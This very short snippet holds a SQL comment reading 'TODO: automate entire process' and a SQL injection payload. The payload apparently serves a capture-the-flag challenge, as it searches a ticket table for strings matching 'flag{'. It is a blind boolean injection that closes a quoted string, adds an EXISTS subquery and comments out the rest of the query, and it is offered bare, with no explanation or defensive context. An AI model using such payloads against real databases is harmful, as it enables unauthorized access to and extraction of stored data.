-- TODO: automate entire process.
`' AND 0 = 1 OR EXISTS (SELECT 0 FROM ticket WHERE ticket.user = user.name AND (header LIKE '%flag{%}%' OR description LIKE '%flag{%}%'))--`
